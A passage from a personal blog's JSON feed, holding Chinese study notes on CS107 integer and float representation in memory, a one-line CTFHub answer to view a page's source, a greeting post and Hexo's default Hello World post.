data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1100</span> <span class=\"token operator\">+</span> <span class=\"token number\">0011</span> <span class=\"token operator\">=</span> <span class=\"token number\">1111</span></pre></td></tr></table></figure><p>这样得到全 1 后，我们只需要再 +1，就可以得到全 0：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1111</span> <span class=\"token operator\">+</span> <span class=\"token number\">0001</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token number\">0000</span>   这里的<span class=\"token number\">1</span>越界了所以不算</pre></td></tr></table></figure><p>所以实际上，我们采用 <strong>全部取反 并 +1</strong> 的方式用来表示负数： -3 （1101）. 这种方法就叫做  <code>2补码</code></p>\n<p>在 short 类型中，为了使 正数和负数 的数量一致，我们把最左边的那一比特空出，用于分割正数和负数，即正数最大为 $2^{15} -1 $：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span> <span class=\"token number\">1</span></pre></td></tr></table></figure><p>负数最小是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>15</mn></msup></mrow><annotation encoding=\"application/x-tex\">- 2^{15}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.897438em;vertical-align:-0.08333em;\"></span><span class=\"mord\">−</span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span></span></span></span></span></span></span></span>：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span> <span class=\"token number\">0</span></pre></td></tr></table></figure><h4 id=\"2语言中变量间的相互赋值是如何实现的\"><a class=\"markdownIt-Anchor\" href=\"#2语言中变量间的相互赋值是如何实现的\">#</a> 2.\t语言中变量间的相互赋值是如何实现的？</h4>\n<p>当我们运行如下程序的时候：</p>\n<pre><code class=\"language-c++\">char ch = 'A';\nshort s = ch;\ncout &lt;&lt; s &lt;&lt; endl;\n------\n65\n</code></pre>\n<p>在内存中就是这样进行的：(每一个格子代表 1byte)，内存直接将 <code>ch</code>  的内容复制道 <code>s</code>  中。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">ch</th>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">65</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">s</td>\n<td style=\"text-align:center\">0</td>\n<td style=\"text-align:center\">65</td>\n</tr>\n</tbody>\n</table>\n<p>如果运行如下程序时：</p>\n<pre><code class=\"language-c++\">short s = 67;\nchar ch = s;\ncout &lt;&lt; ch &lt;&lt; endl;\n------\nC\n</code></pre>\n<p>进行如上赋值操作时，16bit 不能够被直接压缩成为 8bit 的模式。因而 C 和 C++ 中会简单的只关注低位上的内容，而把高位内容直接丢弃。</p>\n<p>如果进行如下程序时：</p>\n<pre><code class=\"language-c++\">short s = -1;\nint i = s;\t\n</code></pre>\n<p>内存中所进行的操作是这样的：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">s</th>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">1…1</th>\n<th style=\"text-align:center\">1…1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">int</td>\n<td style=\"text-align:center\">1…1</td>\n<td style=\"text-align:center\">1…1</td>\n<td style=\"text-align:center\">1…1</td>\n<td style=\"text-align:center\">1…1</td>\n</tr>\n</tbody>\n</table>\n<p>这种操作被称为 “符号扩展”。会将 符号位一位一位向上复制，就会导致 int 的前两字节内全变为 1，使得实际的数值仍然为  <code>-1</code></p>\n<h5 id=\"3浮点数float\"><a class=\"markdownIt-Anchor\" href=\"#3浮点数float\">#</a> 3.\t浮点数 float</h5>\n<p>对于浮点数 float，其将整数范围缩小，节省下来的 bit 位用来表示 2 的负次幂，这样就可以表示小数了。这是技术上可以实现的一种方式，但 <code>实际上并不是这样</code> 。</p>\n<p>实际上对于浮点数这样 4 byte 大小的数，浮点数将其中的 1 位用来表示符号，将其中的 8 位用来表示整数，剩下的 23 位用来表示小数。如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s \t\t\t<span class=\"token function\">exp</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span>bit<span class=\"token punctuation\">)</span>\t\t\t<span class=\"token function\">xxxxxxxx</span><span class=\"token punctuation\">(</span><span class=\"token number\">23</span>bit<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>那么任何一个数都可以用如下形式进行表示：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo>−</mo><mn>1</mn><msup><mo stretchy=\"false\">)</mo><mi>S</mi></msup><mtext>  </mtext><mn>1.</mn><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mtext>  </mtext><mo>×</mo><mtext>  </mtext><msup><mn>2</mn><mrow><mi>e</mi><mi>x</mi><mi>p</mi><mo>−</mo><mn>127</mn></mrow></msup><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mo stretchy=\"false\">(</mo><mn>255</mn><mo>≥</mo><mi>e</mi><mi>x</mi><mi>p</mi><mo>≥</mo><mn>0</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(-1)^S\\;1.xxxxxxxxx\\;×\\;2^{exp-127}     \\;\\;\\;\\;\\;\\;(255≥exp≥0)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.1413309999999999em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\">−</span><span class=\"mord\">1</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05764em;\">S</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1141079999999999em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.864108em;\"><span style=\"top:-3.1130000000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">e</span><span class=\"mord mathnormal mtight\">x</span><span class=\"mord mathnormal mtight\">p</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">7</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≥</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8304100000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≥</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">0</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<p>例如，对于 7.0，我们可以表示为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mn>7.0</mn><mo>×</mo><msup><mn>2</mn><mn>0</mn></msup><mspace linebreak=\"newline\"></mspace><mn>3.5</mn><mo>×</mo><msup><mn>2</mn><mn>1</mn></msup><mspace linebreak=\"newline\"></mspace><mn>1.75</mn><mo>×</mo><msup><mn>2</mn><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">7.0×2^0\\\\\n3.5 ×2^1\\\\\n1.75×2^2\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">7</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">3</span><span class=\"mord\">.</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>总归是可以表示到如上的标准形式。</p>\n<h5 id=\"4整数与浮点数之间的赋值\"><a class=\"markdownIt-Anchor\" href=\"#4整数与浮点数之间的赋值\">#</a> 4.\t整数与浮点数之间的赋值</h5>\n<p>如果有以下程序：</p>\n<pre><code class=\"language-c++\">int i = 5;\nfloat f = i;\ncout &lt;&lt; f &lt;&lt; endl;\n----------\n    \n</code></pre>\n<p>这其中变化是这样的：</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>5</mn></mrow><annotation encoding=\"application/x-tex\">5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">5</span></span></span></span> 被解释为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>5.0</mn><mo>×</mo><msup><mn>2</mn><mn>0</mn></msup></mrow><annotation encoding=\"application/x-tex\">5.0×2^0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">5</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span></span></span> 随后又被解释为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2.5</mn><mo>×</mo><msup><mn>2</mn><mn>1</mn></msup></mrow><annotation encoding=\"application/x-tex\">2.5×2^1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span> 接着又被解释为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>1.25</mn><mo>×</mo><msup><mn>2</mn><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">1.25×2^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span>. 因此 exp = 129，xxx=0.25。</p>\n<p>如果有以下程序：</p>\n<pre><code class=\"language-c++\">int i = 37;\nfloat f = *(float*)&amp;i; // 对i的地址求值\n</code></pre>\n<p>&amp;i 表示 i 的地址，i 是 int 类型的数，因而 &amp;i 是 int * 类型的指针。</p>\n<p>(float*)&amp;i 表示将 int * 类型 转变为了 float * 类型，bit 位置不会发生改变，而因为 37 对应的 bit 位 都落在了 xxxxxx 的位置上，因而 exp = 0，这就是一个奇小无比的数，而不是 37.0</p>\n<p>如果有以下程序：</p>\n<pre><code class=\"language-c++\">float f = 7.0;\nshort s = *(short *)&amp;f;\n</code></pre>\n<p>float 是 4 字节的数，指针指向 float 的最高位。当利用上述代码进行类型强制转换的时候，因为 short 只有 2 字节，因而 float 只有高位的两字节被直接复制过来，定义成了一个 short 类型的数。如下图所示：</p>\n<p><img data-src=\"image-20230921091608188.png\" alt=\"image-20230921091608188\"></p>\n",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/19/WEB%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/",
            "url": "http://yanagi-kon.github.io/2023/09/19/WEB%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/",
            "title": "WEB响应包源代码",
            "date_published": "2023-09-19T04:24:13.000Z",
            "content_html": "<h1 id=\"ctfhub-响应包源代码\"><a class=\"markdownIt-Anchor\" href=\"#ctfhub-响应包源代码\">#</a> CTFHub | 响应包源代码</h1>\n<p>题目网页显示的内容如下：</p>\n<p><img data-src=\"test2.png\" alt=\"test2\"></p>\n<p>打开源代码就可以找到答案：</p>\n<p><img data-src=\"test1.png\" alt=\"test1\"></p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/",
            "url": "http://yanagi-kon.github.io/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/",
            "title": "我的第一篇博客",
            "date_published": "2023-09-18T13:04:24.472Z",
            "content_html": "<p>你好！</p>\n<p>Hello！</p>\n<p>Hallo！</p>\n<p>こんにちわ‼</p>\n",
            "tags": [
                "测试"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/18/hello-world/",
            "url": "http://yanagi-kon.github.io/2023/09/18/hello-world/",
            "title": "Hello World",
            "date_published": "2023-09-18T12:22:51.258Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo new <span class=\"token string\">\"My New Post\"</span></pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo server</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo generate</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo deploy</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": [
                "测试"
            ]
        }
    ]
}